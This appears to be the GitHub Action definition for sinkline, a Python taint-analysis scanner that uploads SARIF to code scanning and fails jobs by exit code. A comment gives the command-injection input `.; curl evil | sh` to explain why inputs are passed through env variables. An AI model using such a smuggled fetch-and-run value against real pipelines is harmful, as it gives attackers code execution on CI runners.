name: sinkline
description: Interprocedural taint analysis for Python web apps (OWASP Top 10), emitting SARIF for GitHub code scanning.
author: Sami Ali
branding:
  icon: git-branch
  color: red
inputs:
  path:
    description: File or directory to scan
    default: "."
  fail-on:
    description: Fail the job if a finding at/above this severity exists (low|medium|high|critical). Empty = never fail.
    default: ""
  min-confidence:
    description: low|medium|high
    default: "low"
  fail-on-parse-error:
    description: >-
      "true" fails the job when any Python file could not be read or parsed (exit code 3), so a
      repository that moves to syntax the parser rejects cannot pass with zero coverage. "false" (default)
      reports those files as SARIF notifications and in the log but does not fail.
    default: "false"
runs:
  using: composite
  steps:
    # Inputs are passed through `env:` and used quoted inside the script. Never write
    # ${{ inputs.* }} inside a `run:` block: the expression is pasted into the shell text
    # before bash parses it, so an input like `.; curl evil | sh` becomes code.
    - shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
      run: pip install "$ACTION_PATH"
    - shell: bash
      env:
        ACTION_PATH: ${{ github.action_path }}
        INPUT_PATH: ${{ inputs.path }}
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
        INPUT_MIN_CONFIDENCE: ${{ inputs.min-confidence }}
        INPUT_FAIL_ON_PARSE_ERROR: ${{ inputs.fail-on-parse-error }}
      run: bash "$ACTION_PATH/scripts/action-scan.sh"
    # a scan that failed before writing a report (exit 2: missing path) has nothing to upload; skip so
    # the final step reports the real error instead of an upload error
    - if: hashFiles('sinkline.sarif') != ''
      uses: github/codeql-action/upload-sarif@9418214df1f2c4b8128c770156c409013b07d6b9 # v3.39.3
      with:
        sarif_file: sinkline.sarif
        category: sinkline
    - shell: bash
      env:
        INPUT_FAIL_ON: ${{ inputs.fail-on }}
      run: |
        rc="${SINKLINE_RC:-0}"
        if [ "$rc" = "1" ]; then
          echo "::error::sinkline found findings at/above $INPUT_FAIL_ON"; exit 1
        elif [ "$rc" = "2" ]; then
          echo "::error::sinkline could not scan the requested path (exit 2): see the scan step log"; exit 1
        elif [ "$rc" = "3" ]; then
          echo "::error::sinkline scan incomplete (exit 3): a file failed to parse with fail-on-parse-error, or no Python file was analyzed"; exit 1
        elif [ "$rc" != "0" ]; then
          echo "::error::sinkline exited with status $rc"; exit 1
        fi
